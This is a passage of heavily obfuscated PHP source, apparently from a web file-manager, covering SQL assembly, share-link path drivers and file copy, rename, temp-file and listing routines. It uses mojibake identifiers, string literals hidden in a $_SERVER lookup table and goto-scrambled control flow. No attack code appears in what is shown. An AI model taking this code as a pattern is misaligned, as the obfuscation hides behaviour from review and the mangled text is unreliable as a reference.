$this->parseLock(isset($C√™ÿ°¯í∂[$c£Ç≤üÀ”î[832]]) ? $C√™ÿ°¯í∂[$c£Ç≤üÀ”î[832]] : !1); if (isset($FæÖÎ…óè‰)) { think_cache($FæÖÎ…óè‰, $FéöÉóçÉè); } goto Eœ…í”ä≠π; DúÜíî›ÜÙ: } public function parseSql($B√ãíØµΩ‘, $b∫€Üæ¿ºﬁ = array()) { $BêıùÃüßâ =& $_SERVER[™⁄»üÆ]; $B√ãíØµΩ‘ = str_replace(array($BêıùÃüßâ[1013], $BêıùÃüßâ[1014], $BêıùÃüßâ[1015], $BêıùÃüßâ[1016], $BêıùÃüßâ[1017], $BêıùÃüßâ[1018], $BêıùÃüßâ[1019], $BêıùÃüßâ[1020], $BêıùÃüßâ[1021], $BêıùÃüßâ[1022], $BêıùÃüßâ[1023]), array($this->parseTable("{$b∫€Üæ¿ºﬁ[$BêıùÃüßâ[277]]}"), $this->parseDistinct(isset($b∫€Üæ¿ºﬁ[$BêıùÃüßâ[1024]]) ? $b∫€Üæ¿ºﬁ[$BêıùÃüßâ[1024]] : !1), $this->parseField(!empty($b∫€Üæ¿ºﬁ[$BêıùÃüßâ[271]]) ? $b∫€Üæ¿ºﬁ[$BêıùÃüßâ[271]] : $BêıùÃüßâ[182]), $this->parseJoin(!empty($b∫€Üæ¿ºﬁ[$BêıùÃüßâ[280]]) ? $b∫€Üæ¿ºﬁ[$BêıùÃüßâ[280]] : $BêıùÃüßâ[33]), $this->parseWhere(!empty($b∫€Üæ¿ºﬁ[$BêıùÃüßâ[273]]) ? $b∫€Üæ¿ºﬁ[$BêıùÃüßâ[273]] : $BêıùÃüßâ[33]), $this->parseGroup(!empty($b∫€Üæ¿ºﬁ[$BêıùÃüßâ[497]]) ? $b∫€Üæ¿ºﬁ[$BêıùÃüßâ[497]] : $BêıùÃüßâ[33]), $this->parseHaving(!empty($b∫€Üæ¿ºﬁ[$BêıùÃüßâ[1025]]) ? $b∫€Üæ¿ºﬁ[$BêıùÃüßâ[1025]] : $BêıùÃüßâ[33]), $this->parseOrder(!empty($b∫€Üæ¿ºﬁ[$BêıùÃüßâ[363]]) ? $b∫€Üæ¿ºﬁ[$BêıùÃüßâ[363]] : $BêıùÃüßâ[33]), $this->parseLimit(!empty($b∫€Üæ¿ºﬁ[$BêıùÃüßâ[290]]) ? $b∫€Üæ¿ºﬁ[$BêıùÃüßâ[290]] : $BêıùÃüßâ[33]), $this->parseUnion(!empty($b∫€Üæ¿ºﬁ[$BêıùÃüßâ[345]]) ? $b∫€Üæ¿ºﬁ[$BêıùÃüßâ[345]] : $BêıùÃüßâ[33]), $this->parseComment(!empty($b∫€Üæ¿ºﬁ[$BêıùÃüßâ[352]]) ? $b∫€Üæ¿ºﬁ[$BêıùÃüßâ[352]] : $BêıùÃüßâ[33])), $B√ãíØµΩ‘); return $B√ãíØµΩ‘; } public function getLastSql($Böà£ÊÉ ä = '') { return $Böà£ÊÉ ä ? $this->modelSql[$Böà£ÊÉ ä] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Cå§ÿçﬂÀ´) { return addslashes($Cå§ÿçﬂÀ´); } public function setModel($D©ﬂ‡äŒ⁄∞) { $this->model = $D©ﬂ‡äŒ⁄∞; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto B¶„ëæŸ…„; D‹πÙ∞üÃÿ: class PathDriverDriverShareItem { public function __construct($fÖ”ôˆ§¢·) { $this->pathParse = $fÖ”ôˆ§¢·; } public function __call($D„ÿ≤™å›ı, $BÁöÁÍØ˜æ) { $D¶Ï¶µã√Æ =& $_SERVER[™⁄»üÆ]; if (method_exists($this, $D„ÿ≤™å›ı)) { return; } $b©∂Ñî§•á = call_user_func_array(array($D¶Ï¶µã√Æ[1223], $D„ÿ≤™å›ı), $BÁöÁÍØ˜æ); $D—¥´√Æ∞≠ = array($D¶Ï¶µã√Æ[1224], $D¶Ï¶µã√Æ[1225], $D¶Ï¶µã√Æ[1226], $D¶Ï¶µã√Æ[1227], $D¶Ï¶µã√Æ[532], $D¶Ï¶µã√Æ[534], $D¶Ï¶µã√Æ[1228], $D¶Ï¶µã√Æ[107], $D¶Ï¶µã√Æ[1229], $D¶Ï¶µã√Æ[1230]); if (in_array($D„ÿ≤™å›ı, $D—¥´√Æ∞≠)) { $b©∂Ñî§•á = $this->getPathOuter($b©∂Ñî§•á); } return $b©∂Ñî§•á; } public function copy($e·ë√Ù«¬ı, $a√çÃ«¢‘À, $C¶⁄Á¥Ü∑≤ = false) { return $this->copyMove($e·ë√Ù«¬ı, $a√çÃ«¢‘À, $C¶⁄Á¥Ü∑≤, $_SERVER[™⁄»üÆ][532]); } public function move($fÓÓ•§ÊÖÂ, $Båï⁄¡—òï, $C≈òﬂ≤∑⁄ñ = false) { return $this->copyMove($fÓÓ•§ÊÖÂ, $Båï⁄¡—òï, $C≈òﬂ≤∑⁄ñ, $_SERVER[™⁄»üÆ][534]); } private function copyMove($C≥çò£é¶ , $FÚ√∑˘ÔÀÉ, $DüÛê«€Üø, $AÛ¿ùç∆ﬂƒ) { goto eµ ∂áÈˆ©; düºÈÖµô®: return $Döﬁû·’¥ü; goto aÙïêü•œ©; D‚´∂Ëåﬁß: if ($d⁄™•Ö¢®£->pathParse[$Dû˜É¡∫Ú[1056]]) { $FÚ√∑˘ÔÀÉ = $d⁄™•Ö¢®£->pathParse[$Dû˜É¡∫Ú[1056]]; } else { $FÚ√∑˘ÔÀÉ = $aæõÖŸËπ∞; } $Döﬁû·’¥ü = IO::copyMove($C≥çò£é¶ , $FÚ√∑˘ÔÀÉ, $DüÛê«€Üø, $AÛ¿ùç∆ﬂƒ); $Döﬁû·’¥ü = $this->getPathOuter($Döﬁû·’¥ü); goto düºÈÖµô®; eµ ∂áÈˆ©: $Dû˜É¡∫Ú =& $_SERVER[™⁄»üÆ]; $aæõÖŸËπ∞ = $FÚ√∑˘ÔÀÉ; $d⁄™•Ö¢®£ = IO::driverMake($FÚ√∑˘ÔÀÉ); goto D‚´∂Ëåﬁß; aÙïêü•œ©: } public function pathThis($f¢ÜÜ„– Ñ) { return get_path_this($this->pathParse[$_SERVER[™⁄»üÆ][76]]); } public function pathFather($dÚû∞…Ö≥Ó) { return get_path_father($this->pathParse[$_SERVER[™⁄»üÆ][76]]); } public function iconvSystem($Eçßòﬁêãˆ) { return $Eçßòﬁêãˆ; } protected function infoParse($EÈõû¢ˆü‰, $B¥Íâ≤€∂À = false) { $Cè¯≥ìÌπ  =& $_SERVER[™⁄»üÆ]; $b∆ﬂ∂ñëÕ∑ = $this->pathParse[$Cè¯≥ìÌπ [467]][$Cè¯≥ìÌπ [1079]] . $this->pathParse[$Cè¯≥ìÌπ [1072]]; if ($B¥Íâ≤€∂À) { $AÇ£õ¡¬¶Ì = IO::infoWithChildren($b∆ﬂ∂ñëÕ∑); } else { $AÇ£õ¡¬¶Ì = IO::info($b∆ﬂ∂ñëÕ∑); } $b⁄ºŒƒ¬ü∞ = $this->pathParse[$Cè¯≥ìÌπ [467]]; return Action($Cè¯≥ìÌπ [1222])->_shareItemeParse($AÇ£õ¡¬¶Ì, $b⁄ºŒƒ¬ü∞); } public function listAll($e¬óå∞◊Í∏) { $b∞…è‚öŒ∏ =& $_SERVER[™⁄»üÆ]; $e¿ç¨†Ñ£Ö = IO::listAll($e¬óå∞◊Í∏); $AÃ†ûç¡Ìæ = $this->pathParse[$b∞…è‚öŒ∏[467]]; foreach ($e¿ç¨†Ñ£Ö as &$cÍÀ¿œòÊö) { check_abort(); $BÉù‹ÂÛ›ö = IO::info($cÍÀ¿œòÊö[$b∞…è‚öŒ∏[76]]); $BÉù‹ÂÛ›ö = is_array($BÉù‹ÂÛ›ö) ? $BÉù‹ÂÛ›ö : array(); $cÍÀ¿œòÊö = array_merge($BÉù‹ÂÛ›ö, $cÍÀ¿œòÊö); $cÍÀ¿œòÊö[$b∞…è‚öŒ∏[85]] = Action($b∞…è‚öŒ∏[1222])->_shareItemeParse($cÍÀ¿œòÊö, $AÃ†ûç¡Ìæ); } unset($cÍÀ¿œòÊö); return $e¿ç¨†Ñ£Ö; } public function getPathOuter($D√—≥©ìÑ∆) { goto c€“á“ Ö»; F™·Øã•Ö†: if (substr($aå·—´úä¬, 0, strlen($BÎ°∂ãäö√)) != $BÎ°∂ãäö√) { return !1; } return $this->pathParse[$c”óõ„ïåŒ[1073]] . $c”óõ„ïåŒ[8] . ltrim($C±ƒ¿Ùá«Õ, $c”óõ„ïåŒ[8]); goto añ¬∏Ñ—ÒË; c€“á“ Ö»: $c”óõ„ïåŒ =& $_SERVER[™⁄»üÆ]; $EÍæ¯…€ø∞ = KodIO::parse($D√—≥©ìÑ∆); if ($EÍæ¯…€ø∞[$c”óõ„ïåŒ[29]] == KodIO::KOD_SHARE_ITEM) { return $EÍæ¯…€ø∞[$c”óõ„ïåŒ[76]]; } goto a·÷‚–Ç±¯; a·÷‚–Ç±¯: $aå·—´úä¬ = KodIO::clear($D√—≥©ìÑ∆); $BÎ°∂ãäö√ = KodIO::clear($this->pathParse[$c”óõ„ïåŒ[467]][$c”óõ„ïåŒ[1079]]); $C±ƒ¿Ùá«Õ = substr($aå·—´úä¬, strlen($BÎ°∂ãäö√)); goto F™·Øã•Ö†; añ¬∏Ñ—ÒË: } public function getType() { $e˘óåÏÎŒß =& $_SERVER[™⁄»üÆ]; $F¿¬ó°ôÀ« = str_replace($e˘óåÏÎŒß[72], $e˘óåÏÎŒß[33], get_class($this)); return strtolower($F¿¬ó°ôÀ«); } public function isTypeObject($Aïà‹πßﬁ¯) { return IO::isTypeObject($Aïà‹πßﬁ¯); } public function info($a”„©ê°ﬁ„) { return $this->infoParse($a”„©ê°ﬁ„); } public function infoAuth($e¡·îäàë˜) { return $this->infoParse($e¡·îäàë˜); } public function infoWithChildren($b»„•÷ÃŸ≠) { return $this->infoParse($b»„•÷ÃŸ≠, !0); } public function infoFull($D¥◊èúÜÂü) { return $this->infoParse($D¥◊èúÜÂü); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($C™‡å«€¥∂) { $this->pathParse = $C™‡å«€¥∂; } protected function infoParse($E‰í≠æ∏ΩŸ, $d¯‚∂µ∏Ú◊ = false) { $B†º£ÙÇŸ· =& $_SERVER[™⁄»üÆ]; return Action($B†º£ÙÇŸ·[1078])->sharePathInfo($this->pathParse[$B†º£ÙÇŸ·[76]], !0, $d¯‚∂µ∏Ú◊); } public function listPath($bã ¿™èÜÈ, $fö’ù»Æå÷ = false) { $AÍÉú…”≠° =& $_SERVER[™⁄»üÆ]; $BÌ°ı´›Æπ = IO::listPath($bã ¿™èÜÈ, $fö’ù»Æå÷); foreach ($BÌ°ı´›Æπ as $a∑Ë±Ì˜„π => $cÉﬁöòÖîï) { if (!in_array($a∑Ë±Ì˜„π, array($AÍÉú…”≠°[74], $AÍÉú…”≠°[75]))) { continue; } foreach ($cÉﬁöòÖîï as $DõÖŒ¡ÚŒæ => $Dﬁ´‘ıƒêƒ) { $Dﬁ´‘ıƒêƒ = Action($AÍÉú…”≠°[1231])->parsePathChildren($Dﬁ´‘ıƒêƒ, array($AÍÉú…”≠°[415] => $bã ¿™èÜÈ)); $BÌ°ı´›Æπ[$a∑Ë±Ì˜„π][$DõÖŒ¡ÚŒæ] = Action($AÍÉú…”≠°[1078])->shareItemInfo($Dﬁ´‘ıƒêƒ); } } return $BÌ°ı´›Æπ; } public function listAll($D–€ÿÑÿæÕ) { $Cì€ —ÁÕè =& $_SERVER[™⁄»üÆ]; $e’•É¥„“¬ = IO::listAll($D–€ÿÑÿæÕ); foreach ($e’•É¥„“¬ as &$fú«ñßÚ‚ê) { $eåäÓÑΩñ¡ = IO::info($fú«ñßÚ‚ê[$Cì€ —ÁÕè[76]]); $eåäÓÑΩñ¡ = is_array($eåäÓÑΩñ¡) ? $eåäÓÑΩñ¡ : array(); $fú«ñßÚ‚ê = array_merge($eåäÓÑΩñ¡, $fú«ñßÚ‚ê); $fú«ñßÚ‚ê[$Cì€ —ÁÕè[85]] = Action($Cì€ —ÁÕè[1078])->shareItemInfo($fú«ñßÚ‚ê); } unset($fú«ñßÚ‚ê); return $e’•É¥„“¬; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($C›âÖﬁä°˘) { parent::__construct($C›âÖﬁä°˘); } } goto DÁ◊¢ùﬁçà; b˘ãÿ•ÉÆõ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $BÑÀ¥—’πò =& $_SERVER[™⁄»üÆ]; $this->objectDriver = array($BÑÀ¥—’πò[57], $BÑÀ¥—’πò[58], $BÑÀ¥—’πò[59], $BÑÀ¥—’πò[60], $BÑÀ¥—’πò[61], $BÑÀ¥—’πò[62], $BÑÀ¥—’πò[63], $BÑÀ¥—’πò[64], $BÑÀ¥—’πò[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($C´≈ÿ≤¨ﬂÈ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($C´≈ÿ≤¨ﬂÈ, $_SERVER[™⁄»üÆ][8]); } return $C´≈ÿ≤¨ﬂÈ; } public function iconvApp($A†ÏÑ∆˜„”) { return $A†ÏÑ∆˜„”; } public function iconvSystem($bâ≤èãŒÉ„) { return $bâ≤èãŒÉ„; } public function iconvTo($b ‚áŒèˆ¥, $cì◊°™éˆ‘, $CŸâ›Öß≈ö) { goto FîÂÖúèëπ; FîÂÖúèëπ: $bˆ€ã‡Ç¨É =& $_SERVER[™⁄»üÆ]; if (!$b ‚áŒèˆ¥ || !function_exists($bˆ€ã‡Ç¨É[66])) { return $b ‚áŒèˆ¥; } static $Cﬂû·¡ã¥– = array(); goto eä‚√ìıê‰; f¨ÀåææøÑ: $Cﬂû·¡ã¥–[$CŸâ›Öß≈ö . $bˆ€ã‡Ç¨É[67] . $cì◊°™éˆ‘ . $bˆ€ã‡Ç¨É[68] . $b ‚áŒèˆ¥] = $b ‚áŒèˆ¥; $Cﬂû·¡ã¥–[$CŸâ›Öß≈ö . $bˆ€ã‡Ç¨É[67] . $cì◊°™éˆ‘ . $bˆ€ã‡Ç¨É[68] . $Fﬁ±ØçÇÉ·] = $b ‚áŒèˆ¥; $Cﬂû·¡ã¥–[$cì◊°™éˆ‘ . $bˆ€ã‡Ç¨É[67] . $CŸâ›Öß≈ö . $bˆ€ã‡Ç¨É[68] . $Fﬁ±ØçÇÉ·] = $Fﬁ±ØçÇÉ·; goto a…ëÓï¯†ı; a…ëÓï¯†ı: return $Fﬁ±ØçÇÉ·; goto e„óÔÜÑ˜≠; eä‚√ìıê‰: $a≈ﬂﬁÇºÔ• = $cì◊°™éˆ‘ . $bˆ€ã‡Ç¨É[67] . $CŸâ›Öß≈ö . $bˆ€ã‡Ç¨É[68] . $b ‚áŒèˆ¥; if (isset($Cﬂû·¡ã¥–[$a≈ﬂﬁÇºÔ•])) { return $Cﬂû·¡ã¥–[$a≈ﬂﬁÇºÔ•]; } if (function_exists($bˆ€ã‡Ç¨É[69])) { $Fﬁ±ØçÇÉ· = @mb_convert_encoding($b ‚áŒèˆ¥, $CŸâ›Öß≈ö, $cì◊°™éˆ‘); } else { $Fﬁ±ØçÇÉ· = @iconv($cì◊°™éˆ‘, $CŸâ›Öß≈ö, $b ‚áŒèˆ¥); } goto b⁄ØÓî–ªõ; b⁄ØÓî–ªõ: $Fﬁ±ØçÇÉ· = $Fﬁ±ØçÇÉ· ? $Fﬁ±ØçÇÉ· : $b ‚áŒèˆ¥; if (strstr($Fﬁ±ØçÇÉ·, $bˆ€ã‡Ç¨É[70])) { $Fﬁ±ØçÇÉ· = str_replace($bˆ€ã‡Ç¨É[70], $bˆ€ã‡Ç¨É[71], $Fﬁ±ØçÇÉ·); } $Cﬂû·¡ã¥–[$cì◊°™éˆ‘ . $bˆ€ã‡Ç¨É[67] . $CŸâ›Öß≈ö . $bˆ€ã‡Ç¨É[68] . $b ‚áŒèˆ¥] = $Fﬁ±ØçÇÉ·; goto f¨ÀåææøÑ; e„óÔÜÑ˜≠: } public function getPathInner($dªúÏßº”…) { $BÑ Ó»∆åØ = IO::init($dªúÏßº”…); return $BÑ Ó»∆åØ->path; } public function getPathOuter($cÎ‘éƒÌ¯é) { $FÁÔ˘Ê›«” =& $_SERVER[™⁄»üÆ]; $E√Ùå≤Œî— = strlen(trim($this->pathBase, $FÁÔ˘Ê›«”[8])); $cÎ‘éƒÌ¯é = substr(trim($cÎ‘éƒÌ¯é, $FÁÔ˘Ê›«”[8]), $E√Ùå≤Œî—); return $this->pathDriver . $FÁÔ˘Ê›«”[8] . ltrim($cÎ‘éƒÌ¯é, $FÁÔ˘Ê›«”[8]); } public function isParentOf($bÉÜúÁ¡¶∞, $Dƒ—ÃÔ¶óÚ) { $DóÚ °ÿéÌ =& $_SERVER[™⁄»üÆ]; $bÉÜúÁ¡¶∞ = rtrim(strtolower($bÉÜúÁ¡¶∞), $DóÚ °ÿéÌ[8]) . $DóÚ °ÿéÌ[8]; $Dƒ—ÃÔ¶óÚ = rtrim(strtolower($Dƒ—ÃÔ¶óÚ), $DóÚ °ÿéÌ[8]) . $DóÚ °ÿéÌ[8]; $C©†≈»ê≈Ü = strpos($Dƒ—ÃÔ¶óÚ, $bÉÜúÁ¡¶∞) === 0; return $C©†≈»ê≈Ü; } public function getType() { $dÌ°¥«¥ì∂ =& $_SERVER[™⁄»üÆ]; $aúîôÑ≥´î = str_replace($dÌ°¥«¥ì∂[72], $dÌ°¥«¥ì∂[33], get_class($this)); return strtolower($aúîôÑ≥´î); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($a≠ÜÀÓûáã, $a∞±±Úî¯£) { $B Ï≠∆¿Û∏ =& $_SERVER[™⁄»üÆ]; $C†∏Ç‚…±ä = rtrim($a≠ÜÀÓûáã, $B Ï≠∆¿Û∏[8]) . $B Ï≠∆¿Û∏[8] . $a∞±±Úî¯£; $Cì›¬ˆäèΩ = $this->exist($C†∏Ç‚…±ä); return $Cì›¬ˆäèΩ ? $C†∏Ç‚…±ä : !1; } public function setModifyTime($DôòıÆ⁄åî, $EŸ∞€ï™í = '') { } public function renameObject($Fº≈ø◊É±ñ, $d õòµœ°´) { goto AéÜê§¡≤¬; AéÜê§¡≤¬: $eÒ—‘å¢òÜ =& $_SERVER[™⁄»üÆ]; $F≤å≈úË°ò = $d õòµœ°´; Hook::trigger($eÒ—‘å¢òÜ[73], $this, $Fº≈ø◊É±ñ, $this, $this->pathFather($Fº≈ø◊É±ñ) . $d õòµœ°´); goto DßÊòØæÑ∏; DßÊòØæÑ∏: $Fº≈ø◊É±ñ = $this->getPathOuter($Fº≈ø◊É±ñ); $d õòµœ°´ = $this->pathFather($Fº≈ø◊É±ñ) . $d õòµœ°´; if (IO::isFile($Fº≈ø◊É±ñ)) { $d˘‘£ì¡§Í = IO::copy($Fº≈ø◊É±ñ, $this->pathFather($Fº≈ø◊É±ñ), REPEAT_RENAME_FOLDER, $F≤å≈úË°ò); if ($d˘‘£ì¡§Í) { IO::remove($Fº≈ø◊É±ñ); } } else { $d˘‘£ì¡§Í = IO::mkdir($d õòµœ°´); if (!$d˘‘£ì¡§Í) { return !1; } $Cﬂ∞≥“≈ôã = IO::listPath($Fº≈ø◊É±ñ, !0); $D€Ïßò†Çñ = array_merge($Cﬂ∞≥“≈ôã[$eÒ—‘å¢òÜ[74]], $Cﬂ∞≥“≈ôã[$eÒ—‘å¢òÜ[75]]); foreach ($D€Ïßò†Çñ as $a©úÑ«Â™») { IO::move($a©úÑ«Â™»[$eÒ—‘å¢òÜ[76]], $d õòµœ°´, REPEAT_RENAME_FOLDER); } IO::remove($Fº≈ø◊É±ñ); } goto eáÁ®Ø†Ë„; eáÁ®Ø†Ë„: return $d˘‘£ì¡§Í ? $d õòµœ°´ : !1; goto E–œû»Ú“é; E–œû»Ú“é: } public function tempFile($F¿ôıË∂õå = '', $D“øÑ”ƒ©î = '') { goto b´¥ëºˆ±á; cÜ©•á˜»·: return $f–ÑªÇÇ˜¢; goto C¶ˆ‘¨‰¥Æ; b´¥ëºˆ±á: if (!$F¿ôıË∂õå) { $F¿ôıË∂õå = rand_string(15); } $dã‘€æÇ’ï = TEMP_FILES . rand_string(15) . $_SERVER[™⁄»üÆ][8]; @mkdir($dã‘€æÇ’ï, 511, !0); goto e„™‰π‰‘ª; e„™‰π‰‘ª: $f–ÑªÇÇ˜¢ = $dã‘€æÇ’ï . $F¿ôıË∂õå; @touch($f–ÑªÇÇ˜¢); if ($D“øÑ”ƒ©î) { file_put_contents($f–ÑªÇÇ˜¢, $D“øÑ”ƒ©î); } goto cÜ©•á˜»·; C¶ˆ‘¨‰¥Æ: } public function tempFileRemve($a≠◊°éÉåº) { @unlink($a≠◊°éÉåº); @rmdir($this->pathFather($a≠◊°éÉåº)); } public function mkfile($Fë≤®ıã⁄Œ, $D √‰¢é–∫ = '', $eÛ≥≈åˆ¶° = REPEAT_RENAME) { } public function mkdir($dΩ∏ã”Îá“, $dä•Ü◊ã⁄÷ = REPEAT_SKIP) { } public function delFile($f•ùœ†åé∂) { } public function delFolder($e˜⁄Ç“‚àô) { } public function copyFile($bº«…⁄‹âø, $CáﬂÙ€µèä) { } public function moveFile($dﬁÆ’ã——‘, $D∞ﬂ…™¡·Õ) { } public function remove($e¢πáÂÆ¥®) { if ($this->isFile($e¢πáÂÆ¥®)) { return $this->delFile($e¢πáÂÆ¥®); } return $this->delFolder($e¢πáÂÆ¥®); } public function rename($eÌ∑Ωâ¨•º, $bÏå‹ñ˘Éﬁ) { } public function exist($Cûÿ—–ºÓÍ) { } public function findByHash($Cÿ≤ÍÇ⁄Ú› = '', $D¨ı∏ΩÌä¡ = '') { return !1; } public function isFile($aêˆﬁìö≈Ù) { } public function isFolder($FˆëµÃ∫∑÷) { } public function size($e’äŒ¬Ÿê∞) { } public function info($c∂ÿõµØ¿∂) { } public function infoSimple($Cì÷Õê«é‘) { return $this->info($Cì÷Õê«é‘); } public function infoAuth($F∑çæ‰‹·à) { return $this->info($F∑çæ‰‹·à); } public function infoFull($Cƒ≥–Ó“È¥) { return $this->info($Cƒ≥–Ó“È¥); } public function infoWithChildren($Cµ£†õÓä¬) { $cÉ‚§“©≠√ =& $_SERVER[™⁄»üÆ]; static $eƒ˘á≈∏¡Ø = array(); if (isset($eƒ˘á≈∏¡Ø[$Cµ£†õÓä¬])) { return $eƒ˘á≈∏¡Ø[$Cµ£†õÓä¬]; } $CâúÁ¥ççÂ = $this->info($Cµ£†õÓä¬); if ($CâúÁ¥ççÂ && $CâúÁ¥ççÂ[$cÉ‚§“©≠√[29]] == $cÉ‚§“©≠√[77]) { $b¬¢ﬁò∫âˆ = array($cÉ‚§“©≠√[78] => 0, $cÉ‚§“©≠√[79] => 0, $cÉ‚§“©≠√[80] => 0); $this->infoChildren($Cµ£†õÓä¬, $b¬¢ﬁò∫âˆ); $CâúÁ¥ççÂ[$cÉ‚§“©≠√[78]] = $b¬¢ﬁò∫âˆ[$cÉ‚§“©≠√[78]]; $CâúÁ¥ççÂ[$cÉ‚§“©≠√[81]] = array($cÉ‚§“©≠√[82] => $b¬¢ﬁò∫âˆ[$cÉ‚§“©≠√[79]], $cÉ‚§“©≠√[83] => $b¬¢ﬁò∫âˆ[$cÉ‚§“©≠√[80]]); $eƒ˘á≈∏¡Ø[$Cµ£†õÓä¬] = $CâúÁ¥ççÂ; } return $CâúÁ¥ççÂ; } public function listPath($Dƒà§Ø£¡õ, $aﬁÈΩŸÇó« = false) { } public function has($C·©‚åƒ¶É, $CÊÖø◊◊¢Ñ = false, $CÊÓÔ÷ò„· = false) { } public function canRead($bÃÆ∞˘Ùõê) { } public function canWrite($fÇ’∏±ŒÀˆ) { } public function getContent($EÒ©ÜÍÆÍõ) { } public function setContent($döó‡«Ø‰¥, $Dã¡‡≤èÉø = '') { } protected function infoChildren($D•ﬁ∫æì¢ê, &$eÑ¥°ÇŒ¨Œ) { $eê⁄Ñ‘ÂÚÈ =& $_SERVER[™⁄»üÆ]; check_abort_echo(); $b⁄‹®Ñî…Î = $this->listPath($D•ﬁ∫æì¢ê, !0); $b⁄‹®Ñî…Î = array_merge($b⁄‹®Ñî…Î[$eê⁄Ñ‘ÂÚÈ[75]], $b⁄‹®Ñî…Î[$eê⁄Ñ‘ÂÚÈ[74]]); foreach ($b⁄‹®Ñî…Î as $b√Ì’ÿ…ÿ) { if ($b√Ì’ÿ…ÿ[$eê⁄Ñ‘ÂÚÈ[29]] == $eê⁄Ñ‘ÂÚÈ[77]) { $eÑ¥°ÇŒ¨Œ[$eê⁄Ñ‘ÂÚÈ[80]]++; $e‰É…ÌÚç• = $this->getPathInner($b√Ì’ÿ…ÿ[$eê⁄Ñ‘ÂÚÈ[76]]); $this->infoChildren($e‰É…ÌÚç•, $eÑ¥°ÇŒ¨Œ); } else { $eÑ¥°ÇŒ¨Œ[$eê⁄Ñ‘ÂÚÈ[79]]++; $eÑ¥°ÇŒ¨Œ[$eê⁄Ñ‘ÂÚÈ[78]] += $b√Ì’ÿ…ÿ[$eê⁄Ñ‘ÂÚÈ[78]]; } } } public function fileSubstr($dÜ≈ãΩ∏öû, $fÇãÏùô≥ô, $a∂¿ªÕóŒü) { } public function listAll($fƒƒã’⁄◊ﬁ) { } public function listAllMake($få∞¨≤ÎÉ‘, &$eœ†Ü≠Õ±¡) { $E‰Ω¡‚œãü =& $_SERVER[™⁄»üÆ]; check_abort_echo(); $cä™¬Í´ÈÙ = $this->listPath($få∞¨≤ÎÉ‘, !0); if (!$cä™¬Í´ÈÙ) { return; } $cÁÏﬁÒî≤◊ = array_merge($cä™¬Í´ÈÙ[$E‰Ω¡‚œãü[75]], $cä™¬Í´ÈÙ[$E‰Ω¡‚œãü[74]]); foreach ($cÁÏﬁÒî≤◊ as $fÆ°Ñµûîö) { goto e√óœıª®Ô; cÇü•´ßÇ™: $this->listAllMake($fÆ°Ñµûîö[$E‰Ω¡‚œãü[76]], $eœ†Ü≠Õ±¡); goto B–ΩÒ≥∂∞∂; B•˘ŒÛ“çÙ: if (isset($fÆ°Ñµûîö[$E‰Ω¡‚œãü[84]])) { $d‡πíÀÖ≤Œ[$E‰Ω¡‚œãü[84]] = $fÆ°Ñµûîö[$E‰Ω¡‚œãü[84]]; } if (!$cÇá£ØÊ»Ü) { $eœ†Ü≠Õ±¡[] = $d‡πíÀÖ≤Œ; continue; } $eœ†Ü≠Õ±¡[] = $d‡πíÀÖ≤Œ; goto cÇü•´ßÇ™; e√óœıª®Ô: $cÇá£ØÊ»Ü = $fÆ°Ñµûîö[$E‰Ω¡‚œãü[29]] == $E‰Ω¡‚œãü[77]; $d‡πíÀÖ≤Œ = array($E‰Ω¡‚œãü[76] => $fÆ°Ñµûîö[$E‰Ω¡‚œãü[76]], $E‰Ω¡‚œãü[77] => $cÇá£ØÊ»Ü); if (isset($fÆ°Ñµûîö[$E‰Ω¡‚œãü[78]])) { $d‡πíÀÖ≤Œ[$E‰Ω¡‚œãü[78]] = $fÆ°Ñµûîö[$E‰Ω¡‚œãü[78]]; } goto B•˘ŒÛ“çÙ; B–ΩÒ≥∂∞∂: } } public function listAllSimple($b¢Ìñ≤ÿÁÜ) { $EÇ∫‡¢èó† =& $_SERVER[™⁄»üÆ]; $Cå≠◊Úã«è = array(); $c®Ëˆç≥úÀ = $this->listAll($b¢Ìñ≤ÿÁÜ); $Fúäë•ËÖ∆ = $this->getPathOuter($b¢Ìñ≤ÿÁÜ); foreach ($c®Ëˆç≥úÀ as $e∏Â∏èñ¥ ) { goto aÓçô‹õéΩ; aÓçô‹õéΩ: $e“Æ÷Òâèß = $e∏Â∏èñ¥ [$EÇ∫‡¢èó†[76]]; $eÚŒÚ÷¢Ó≠ = $e∏Â∏èñ¥ [$EÇ∫‡¢èó†[76]]; if (isset($e∏Â∏èñ¥ [$EÇ∫‡¢èó†[85]])) { $e“Æ÷Òâèß = $e∏Â∏èñ¥ [$EÇ∫‡¢èó†[85]][$EÇ∫‡¢èó†[76]]; $e∏Â∏èñ¥ [$EÇ∫‡¢èó†[78]] = $e∏Â∏èñ¥ [$EÇ∫‡¢èó†[85]][$EÇ∫‡¢èó†[78]]; $e∏Â∏èñ¥ [$EÇ∫‡¢èó†[84]] = $e∏Â∏èñ¥ [$EÇ∫‡¢èó†[85]][$EÇ∫‡¢èó†[84]]; } else { $eÚŒÚ÷¢Ó≠ = substr($e∏Â∏èñ¥ [$EÇ∫‡¢èó†[76]], strlen(get_path_father($Fúäë•ËÖ∆))); $eÚŒÚ÷¢Ó≠ = $EÇ∫‡¢èó†[8] . ltrim($eÚŒÚ÷¢Ó≠, $EÇ∫‡¢èó†[8]); } goto dﬂ£Ãàõ¿ÿ; eÇ¯ô÷ä÷–: if (!$e∏Â∏èñ¥ [$EÇ∫‡¢èó†[77]]) { $D”å∆µÂêﬁ[$EÇ∫‡¢èó†[86]] = $e“Æ÷Òâèß; } $Cå≠◊Úã«è[] = $D”å∆µÂêﬁ; goto F™√™••ª‹; dﬂ£Ãàõ¿ÿ: $D”å∆µÂêﬁ = array($EÇ∫‡¢èó†[76] => $eÚŒÚ÷¢Ó≠, $EÇ∫‡¢èó†[77] => $e∏Â∏èñ¥ [$EÇ∫‡¢èó†[77]]); if (isset($e∏Â∏èñ¥ [$EÇ∫‡¢èó†[78]]) && !$e∏Â∏èñ¥ [$EÇ∫‡¢èó†[77]]) { $D”å∆µÂêﬁ[$EÇ∫‡¢èó†[78]] = $e∏Â∏èñ¥ [$EÇ∫‡¢èó†[78]]; } if 